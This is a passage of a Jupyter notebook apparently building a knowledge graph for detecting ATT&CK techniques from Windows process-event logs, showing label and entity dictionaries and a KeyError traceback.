       " 15: 'T1564.004_76b6066fe170d38215251102e42be973_I',\n",
       " 16: 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_B',\n",
       " 17: 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_B',\n",
       " 18: 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_I',\n",
       " 19: 'T1003.002_5a484b65c247675e3b7ada4ba648d376_I',\n",
       " 20: 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_I',\n",
       " 21: 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_B',\n",
       " 22: 'T1105_1095434782a00c8a4772a11e625bcf5d_B',\n",
       " 23: 'T1053.005_5db2884b6ca3ab932848f295a3896dc0_B',\n",
       " 24: 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_B',\n",
       " 25: 'T1105_c521e0a70b243a0cf9217907ca3c6d27_B',\n",
       " 26: 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_I',\n",
       " 27: 'T1124_fa6e8607-e0b1-425d-8924-9b894da5a002_B',\n",
       " 28: 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_B',\n",
       " 29: 'T1053.005_ee454be9197890de62705ce6255933fd_B',\n",
       " 30: 'T1204.002_522f3f35cd013e63830fa555495a0081_I',\n",
       " 31: 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_B',\n",
       " 32: 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_I',\n",
       " 33: 'T1115_70795de7cbb842edb029b3378c27c008_I',\n",
       " 34: 'T1562.004_280003641a5cddf916c4f2bf605a71d3_B',\n",
       " 35: 'T1036.004_7de3d7b4922a7b996d8df36fb22bb118_B',\n",
       " 36: 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_I',\n",
       " 37: 'T1562.002_94f51bf01a7036fe02d07b4c18967669_B',\n",
       " 38: 'T1219_7dabcbecab0334b115feefab1630f84a_I',\n",
       " 39: 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_I',\n",
       " 40: 'T1552.002_3e5b04b8ee0a1a4950da8f35d95e65fc_B',\n",
       " 41: 'T1057_8adf02e8-6e71-4244-886c-98c402857404_I',\n",
       " 42: 'T1560_a1ee301b0508747b468d578a14e5c1a5_I',\n",
       " 43: 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_I',\n",
       " 44: 'T1546.013_f9a968af61d36983448c74cca5464e17_B',\n",
       " 45: 'T1491_68235976-2404-42a8-9105-68230cfef562_B',\n",
       " 46: 'T1562.002_94f51bf01a7036fe02d07b4c18967669_I',\n",
       " 47: 'T1217_69bbe2183fa09c00ccaac62d48e214f8_I',\n",
       " 48: 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_I',\n",
       " 49: 'T1040_6881a4589710d53f0c146e91db513f01_B',\n",
       " 50: 'T1531_b25ae80dad74142fafb510e9c1949ace_B',\n",
       " 51: 'T1047_6935e41353aa781bb723462d26114c44_B',\n",
       " 52: 'T1018_a44bb43474728496276d5d73aa14588f_B',\n",
       " 53: 'T1547.010_4593d72a5145e3f494421ac772d37464_I',\n",
       " 54: 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_I',\n",
       " 55: 'T1125_da86001b5081fcf773d8e62f22cf2b00_I',\n",
       " 56: 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_B',\n",
       " 57: 'T1055.001_a74bc239-a196-4f7e-8d5c-fe8c0266071c_B',\n",
       " 58: 'T1547.001_163b023f43aba758d36f524d146cb8ea_B',\n",
       " 59: 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_B',\n",
       " 60: 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_B',\n",
       " 61: 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_I',\n",
       " 62: 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_I',\n",
       " 63: 'T1518_8ddfaf982ab359cda13626b870ccb339_B',\n",
       " 64: 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_I',\n",
       " 65: 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_I',\n",
       " 66: 'T1105_e6715e61f5df646692c624b3499384c4_B',\n",
       " 67: 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_B',\n",
       " 68: 'T1486_d82ceb9939d3d920ee550187ad8235c8_I',\n",
       " 69: 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_I',\n",
       " 70: 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_I',\n",
       " 71: 'T1112_257313a3c93e3bb7dfb60d6753b09e34_B',\n",
       " 72: 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_I',\n",
       " 73: 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_B',\n",
       " 74: 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_B',\n",
       " 75: 'T1547.001_777043894e42d2aae3881e63f6c76d33_I',\n",
       " 76: 'T1082_29451844-9b76-4e16-a9ee-d6feab4b24db_B',\n",
       " 77: 'T1490_9e5e4c0655fd1b5be88bd40b8251175f_B',\n",
       " 78: 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_I',\n",
       " 79: 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_B',\n",
       " 80: 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_I',\n",
       " 81: 'T1119_7121cdf93b951311be9d7078c602efdc_I',\n",
       " 82: 'T1105_1095434782a00c8a4772a11e625bcf5d_I',\n",
       " 83: 'T1201_38f6f0e50a6b196140ec40d3dc9cc9e6_B',\n",
       " 84: 'T1564_dedfa0a54c9c13ce5714a0dc2e1f5d1a_B',\n",
       " 85: 'T1112_4bfb5f265a5ce07af6bf10da113af7db_B',\n",
       " 86: 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_I',\n",
       " 87: 'T1562.004_41627f71f968225b9f162cb76d16bd9d_I',\n",
       " 88: 'T1518_8ddfaf982ab359cda13626b870ccb339_I',\n",
       " 89: 'T1112_fd992e8ecfdac9b56dd6868904044827_B',\n",
       " 90: 'T1518.001_33a24ff44719e6ac0614b58f8c9a7c72_B',\n",
       " 91: 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_I',\n",
       " 92: 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_I',\n",
       " 93: 'T1547.010_4593d72a5145e3f494421ac772d37464_B',\n",
       " 94: 'T1069.002_6103e503cb444bc7b4187704f2035708_B',\n",
       " 95: 'T1125_da86001b5081fcf773d8e62f22cf2b00_B',\n",
       " 96: 'T1120_7b9c7afaefa59aab759b49af0d699ac1_I',\n",
       " 97: 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_I',\n",
       " 98: 'T1055.002_e5bcefee-262d-4568-a261-e8a20855ec81_B',\n",
       " 99: 'T1566.001_1afaec09315ab71fdfb167175e8a019a_I',\n",
       " 100: 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_I',\n",
       " 101: 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_I',\n",
       " 102: 'T1123_372e6f46fca18e4f1b43209c20ffafa2_I',\n",
       " 103: 'T1003.002_7fa4ea18694f2552547b65e23952cabb_I',\n",
       " 104: 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_I',\n",
       " 105: 'T1137_12ad9edefc86af07700fbf49bfdac6ba_B',\n",
       " 106: 'T1057_5a39d7ed-45c9-4a79-b581-e5fb99e24f65_B',\n",
       " 107: 'T1112_ba6f6214dbd17c54001e0a163b60f151_I',\n",
       " 108: 'T1562.004_41627f71f968225b9f162cb76d16bd9d_B',\n",
       " 109: 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_B',\n",
       " 110: 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_B',\n",
       " 111: 'T1016_14a21534-350f-4d83-9dd7-3c56b93a0c17_B',\n",
       " 112: 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_I',\n",
       " 113: 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_B',\n",
       " 114: 'T1204.002_522f3f35cd013e63830fa555495a0081_B',\n",
       " 115: 'T1105_c76968acda4aa1673dadcd67f3ab7664_I',\n",
       " 116: 'T1135_530e47c6-8592-42bf-91df-c59ffbd8541b_B',\n",
       " 117: 'T1018_26c8b8b5-7b5b-4de1-a128-7d37fb14f517_B',\n",
       " 118: 'T1547_fe9eeee9a7b339089e5fa634b08522c1_B',\n",
       " 119: 'T1564.004_76b6066fe170d38215251102e42be973_B',\n",
       " 120: 'T1059.003_6c318ef0339d74d909ad556681b6493e_B',\n",
       " 121: 'T1112_cab7b85611a290c0769546bfa9d6f962_I',\n",
       " 122: 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_I',\n",
       " 123: 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_B',\n",
       " 124: 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_I',\n",
       " 125: 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_B',\n",
       " 126: 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_B',\n",
       " 127: 'T1566.001_1afaec09315ab71fdfb167175e8a019a_B',\n",
       " 128: 'T1560_a1ee301b0508747b468d578a14e5c1a5_B',\n",
       " 129: 'T1007_9d03c91bdae5a80f17f89c987942b5a8_B',\n",
       " 130: 'T1033_bd527b63-9f9e-46e0-9816-b8434d2b8989_B',\n",
       " 131: 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_B',\n",
       " 132: 'T1112_e7a987cbef27263e666e5b096488dc55_B',\n",
       " 133: 'T1112_ba6f6214dbd17c54001e0a163b60f151_B',\n",
       " 134: 'T1047_ac2764f7a67a9ce92b54e8e59b361838_B',\n",
       " 135: 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_B',\n",
       " 136: 'T1112_35c0360d226cf38104f300d9d57ce60e_I',\n",
       " 137: 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_B',\n",
       " 138: 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_B',\n",
       " 139: 'T1040_6881a4589710d53f0c146e91db513f01_I',\n",
       " 140: 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_B',\n",
       " 141: 'T1547.004_0856714c9810ac55b53e9964d02958a0_B',\n",
       " 142: 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_B',\n",
       " 143: 'T1546.013_f9a968af61d36983448c74cca5464e17_I',\n",
       " 144: 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_B',\n",
       " 145: 'T1087.001_feaced8f-f43f-452a-9500-a5219488abb8_B',\n",
       " 146: 'T1112_fd992e8ecfdac9b56dd6868904044827_I',\n",
       " 147: 'T1574.001_63bbedafba2f541552ac3579e9e3737b_I',\n",
       " 148: 'T1497.001_1258b063-27d6-489b-a677-4807faacf868_B',\n",
       " 149: 'T1137_12ad9edefc86af07700fbf49bfdac6ba_I',\n",
       " 150: 'T1003_18f31c311ac208802e88ab8d5af8603e_B',\n",
       " 151: 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_B',\n",
       " 152: 'T1112_257313a3c93e3bb7dfb60d6753b09e34_I',\n",
       " 153: 'T1105_e6715e61f5df646692c624b3499384c4_I',\n",
       " 154: 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_B',\n",
       " 155: 'T1201_57296a2ddbeb7423c05feef2fe972111_B',\n",
       " 156: 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_B',\n",
       " 157: 'T1547_fe9eeee9a7b339089e5fa634b08522c1_I',\n",
       " 158: 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_I',\n",
       " 159: 'T1490_e90756bb6dcd21462dc4cc452661df91_B',\n",
       " 160: 'T1547.009_b6e5c895c6709fe289352ee23f062229_B',\n",
       " 161: 'T1007_d6bb2a19da7246731ed9c44831b135f8_B',\n",
       " 162: 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_B',\n",
       " 163: 'T1562.001_43e3334362b140924f001b256b229ee5_B',\n",
       " 164: 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_I',\n",
       " 165: 'T1497.001_5dc841fd-28ad-40e2-b10e-fb007fe09e81_B',\n",
       " 166: 'T1105_4f683658f161ccdc51337c470d32bab9_I',\n",
       " 167: 'T1007_c6607391-d02c-44b5-9b13-d3492ca58599_B',\n",
       " 168: 'T1217_69bbe2183fa09c00ccaac62d48e214f8_B',\n",
       " 169: 'T1112_cd8be0e6b873919da25530a2c7ea6750_I',\n",
       " 170: 'T1531_aa6b15485a5f50ced34d87fda177b758_B',\n",
       " 171: 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_B',\n",
       " 172: 'T1036.004_1f0614ea5c4af6faf1b44570f5f22f8a_B',\n",
       " 173: 'T1083_6e1a53c0-7352-4899-be35-fa7f364d5722_B',\n",
       " 174: 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_B',\n",
       " 175: 'T1016_71b3d2945679566b9d94d8cb11df4b70_B',\n",
       " 176: 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_B',\n",
       " 177: 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_B',\n",
       " 178: 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_B',\n",
       " 179: 'T1562.001_43e3334362b140924f001b256b229ee5_I',\n",
       " 180: 'T1057_8adf02e8-6e71-4244-886c-98c402857404_B',\n",
       " 181: 'T1497.001_7a6ba833-de40-466a-8969-5c37b13603e0_B',\n",
       " 182: 'T1003.001_35d92515122effdd73801c6ac3021da7_B',\n",
       " 183: 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_B',\n",
       " 184: 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_B',\n",
       " 185: 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_I',\n",
       " 186: 'T1490_c156ac5c9fa67080365268d95f29053d_B',\n",
       " 187: 'T1574.001_63bbedafba2f541552ac3579e9e3737b_B',\n",
       " 188: 'T1105_c521e0a70b243a0cf9217907ca3c6d27_I',\n",
       " 189: 'T1112_4bfb5f265a5ce07af6bf10da113af7db_I',\n",
       " 190: 'T1003_18f31c311ac208802e88ab8d5af8603e_I',\n",
       " 191: 'T1547.009_b6e5c895c6709fe289352ee23f062229_I',\n",
       " 192: 'T1087.001_6334877e8e3ba48f7835d4856d90a282_B',\n",
       " 193: 'T1112_e7a987cbef27263e666e5b096488dc55_I',\n",
       " 194: 'T1112_35c0360d226cf38104f300d9d57ce60e_B',\n",
       " 195: 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_I',\n",
       " 196: 'T1490_8467c994685ccf178db166964bd80fab_B',\n",
       " 197: 'T1217_f7a0f7d704aa52a764d9d1bee81e65d6_B',\n",
       " 198: 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_B',\n",
       " 199: 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_I',\n",
       " 200: 'T1486_d82ceb9939d3d920ee550187ad8235c8_B',\n",
       " 201: 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_B',\n",
       " 202: 'T1003.002_5a484b65c247675e3b7ada4ba648d376_B',\n",
       " 203: 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_I',\n",
       " 204: 'T1033_c0da588f-79f0-4263-8998-7496b1a40596_B',\n",
       " 205: 'T1078.001_d0ca00832890baa1d42322cf70fcab1a_B',\n",
       " 206: 'T1547.001_163b023f43aba758d36f524d146cb8ea_I',\n",
       " 207: 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_I',\n",
       " 208: 'T1016_e8017c46-acb8-400c-a4b5-b3362b5b5baa_B',\n",
       " 209: 'T1482_cfb61005899996469ae3023796792ca5_B',\n",
       " 210: 'T1003.003_9f73269695e54311dd61dc68940fb3e1_B',\n",
       " 211: 'T1003.003_f049b89533298c2d6cd37a940248b219_B',\n",
       " 212: 'T1047_ed736a123da6fb2aab22cfd4f437e8b5_B',\n",
       " 213: 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_I',\n",
       " 214: 'T1071.001_24c3b7b004401d839a5c337201da3484_I',\n",
       " 215: 'T1105_c76968acda4aa1673dadcd67f3ab7664_B',\n",
       " 216: 'T1491_68235976-2404-42a8-9105-68230cfef562_I',\n",
       " 217: 'T1115_b007fe0c-c6b0-4fda-915c-255bbc070de2_B',\n",
       " 218: 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_B',\n",
       " 219: 'T1490_2d53d6fabd39bf9c70b0dfcdfbbc926d_B',\n",
       " 220: 'T1071.001_24c3b7b004401d839a5c337201da3484_B',\n",
       " 221: 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_I',\n",
       " 222: 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_I',\n",
       " 223: 'T1562.004_5b93df032e230056c21a3e57334f77d1_B',\n",
       " 224: 'T1057_b2a1e430ca6d36eb5af2fe666e769847_B',\n",
       " 225: 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_I',\n",
       " 226: 'T1112_34041639e6e501856ecaf5969ee29c76_B',\n",
       " 227: 'T1087.001_6334877e8e3ba48f7835d4856d90a282_I',\n",
       " 228: 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_B',\n",
       " 229: 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_I',\n",
       " 230: 'T1112_e74d2fb4ef5fa6c766a4151554033697_I',\n",
       " 231: 'T1057_f8de05d1741dcc468f772ab0ff4dac72_B',\n",
       " 232: 'T1564.001_66a5fd5f244819181f074dd082a28905_I',\n",
       " 233: 'T1120_7b9c7afaefa59aab759b49af0d699ac1_B',\n",
       " 234: 'T1003.001_35d92515122effdd73801c6ac3021da7_I',\n",
       " 235: 'T1219_7dabcbecab0334b115feefab1630f84a_B',\n",
       " 236: 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_I',\n",
       " 237: 'T1049_a14392d713dffba6a397682ff83259a0_B',\n",
       " 238: 'T1047_f4b0b4129560ea66f9751275e82f6bab_I',\n",
       " 239: 'T1049_638fb6bb-ba39-4285-93d1-7e4775b033a8_B',\n",
       " 240: 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_B',\n",
       " 241: 'T1047_b0255b5120cbabc062d8d4510a142c3b_B',\n",
       " 242: 'T1112_cd8be0e6b873919da25530a2c7ea6750_B',\n",
       " 243: 'T1112_cab7b85611a290c0769546bfa9d6f962_B',\n",
       " 244: 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_I',\n",
       " 245: 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_I',\n",
       " 246: 'T1518.001_b8453a5fe06b24aea12b27592d5c3d3a_B',\n",
       " 247: 'T1016_921055f4-5970-4707-909e-62f594234d91_I',\n",
       " 248: 'T1018_ac20e592bc912bddff4d6b88289095f0_B',\n",
       " 249: 'T1562.004_5b93df032e230056c21a3e57334f77d1_I',\n",
       " 250: 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_B',\n",
       " 251: 'T1069.001_a1f48fa3ddee658b29b414523c9a295b_B',\n",
       " 252: 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_I',\n",
       " 253: 'T1135_deeac480-5c2a-42b5-90bb-41675ee53c7e_B',\n",
       " 254: 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_I',\n",
       " 255: 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_B',\n",
       " 256: 'T1007_9d03c91bdae5a80f17f89c987942b5a8_I',\n",
       " 257: 'T1564.001_66a5fd5f244819181f074dd082a28905_B',\n",
       " 258: 'O',\n",
       " 259: 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_I',\n",
       " 260: 'T1105_4f683658f161ccdc51337c470d32bab9_B',\n",
       " 261: 'T1047_ac122553ab4426ea3362bb4a97d31bfd_B',\n",
       " 262: 'T1123_372e6f46fca18e4f1b43209c20ffafa2_B',\n",
       " 263: 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_B',\n",
       " 264: 'T1059.003_6c318ef0339d74d909ad556681b6493e_I',\n",
       " 265: 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_B',\n",
       " 266: 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_I',\n",
       " 267: 'T1547.004_0856714c9810ac55b53e9964d02958a0_I',\n",
       " 268: 'T1016_7d8ee68f0e9731db82964f558f614608_B',\n",
       " 269: 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_B',\n",
       " 270: 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_B',\n",
       " 271: 'T1112_e74d2fb4ef5fa6c766a4151554033697_B',\n",
       " 272: 'T1119_7121cdf93b951311be9d7078c602efdc_B',\n",
       " 273: 'T1115_70795de7cbb842edb029b3378c27c008_B'}"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "index2label = {v: k for k, v in label2index.items()}\n",
    "\n",
    "index2label"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "7fb6e38a-79df-42f4-97b7-d0edba7d40fd",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Process Create': 0,\n",
       " 'Process Start': 1,\n",
       " 'CreateFile': 2,\n",
       " 'SetBasicInformationFile': 3,\n",
       " 'SetDispositionInformationEx': 4,\n",
       " 'SetDispositionInformationFile': 5,\n",
       " 'WriteFile': 6,\n",
       " 'TCP Connect': 7,\n",
       " 'TCP Send': 8,\n",
       " 'UDP Send': 9,\n",
       " 'TCP Disconnect': 10,\n",
       " 'RegQueryKey': 11,\n",
       " 'RegQueryValue': 12,\n",
       " 'CloseFile': 13,\n",
       " 'QueryAllInformationFile': 14,\n",
       " 'QueryAttributeTagFile': 15,\n",
       " 'QueryBasicInformationFile': 16,\n",
       " 'QueryDirectory': 17,\n",
       " 'QueryNetworkOpenInformationFile': 18,\n",
       " 'ReadFile': 19,\n",
       " 'TCP Receive': 20,\n",
       " 'UDP Receive': 21,\n",
       " 'RegCreateKey': 22,\n",
       " 'RegSetValue': 23,\n",
       " 'RegCloseKey': 24,\n",
       " 'RegDeleteValue': 25,\n",
       " 'RegOpenKey': 26}"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_path = '../data/3_openKE_3/relation2id.txt'\n",
    "edge_ent2idx = build_dictionary(file_path)\n",
    "\n",
    "edge_ent2idx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "9d870077-a538-480d-98f3-794a03b48914",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "file_path = '../data/3_openKE_3/entity2id.txt'\n",
    "node_ent2id_txt = build_dictionary(file_path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "b24f3c77-9395-4ce2-beb1-f1f80cea32ff",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "477549\n"
     ]
    },
    {
     "ename": "KeyError",
     "evalue": "'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[10], line 2\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[38;5;28mprint\u001b[39m(node_ent2id_txt[\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m4379921687c9a557f14c36d23279d6d4b8304e34d2cc904f9c8b9efed7824778.bin\u001b[39m\u001b[38;5;124m'\u001b[39m])\n\u001b[0;32m----> 2\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[43mnode_ent2id_txt\u001b[49m\u001b[43m[\u001b[49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;124;43mHKLM\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mSystem\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mCurrentControlSet\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mControl\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mSafeBoot\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mOption\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m]\u001b[49m)\n\u001b[1;32m      3\u001b[0m \u001b[38;5;28mprint\u001b[39m(node_ent2id_txt[\u001b[38;5;124m'\u001b[39m\u001b[38;5;130;01m\\x1f\u001b[39;00m\u001b[38;5;124m@028;0 2K5740 70 3@0=8FC A>B@C4=8:0<.exe\u001b[39m\u001b[38;5;124m'\u001b[39m])\n",
      "\u001b[0;31mKeyError\u001b[0m: 'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'"
     ]
    }
   ],
   "source": [
    "print(node_ent2id_txt['4379921687c9a557f14c36d23279d6d4b8304e34d2cc904f9c8b9efed7824778.bin'])\n",
    "print(node_ent2id_txt['HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'])\n",
    "print(node_ent2id_txt['\\x1f@028;0 2K5740 70 3@0=8FC A>B@C4=8:0<.exe'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "d29fcf1e-2e29-4b5f-9f46-2f784fcc161b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "816212"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(node_ent2id_txt)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "5d59c16c-1b10-45f8-8054-90438e29fd00",
   "metadata": {},
   "outputs": [],
   "source": [
    "# node_ent2idx = build_dictionary('../data/3_openKE/entity2id.txt')\n",
    "\n",
    "with open (f'../data/3_openKE_2/entity2id.pkl', 'rb') as fp:\n",
    "    node_ent2idx = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "712d8d18-85a4-46cc-a386-b32e7c4c471c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "395360\n",
      "437670\n",
      "663432\n"
     ]
    }
   ],
   "source": [
    "print(node_ent2idx['4379921687c9a557f14c36d23279d6d4b8304e34d2cc904f9c8b9efed7824778.bin'])\n",
    "print(node_ent2idx['HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'])\n",
    "print(node_ent2idx['\\x1f@028;0 2K5740 70 3@0=8FC A>B@C4=8:0<.exe'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "1c28c44a-4a77-4a0b-bab9-d2ad209c9781",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "816212"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(node_ent2idx)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "588c84e1-301b-4a3d-88cb-59d7a01283e5",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\hyphen-data\\\\101.0.4906.0\\\\*': 0,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BingWeather_8wekyb3d8bbwe\\\\LocalState\\\\.git': 1,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-GB': 2,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\ListSync\\\\.git': 3,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Web Notifications Deny List\\\\.git': 4,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Microsoft\\\\InputPersonalization\\\\*': 5,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\cache2\\\\.git': 6,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\en_GB\\\\*': 7,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-CI\\\\*': 8,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\WidevineCdm\\\\4.10.2391.6\\\\.git': 9,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\\\.git': 10,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-419': 11,\n",
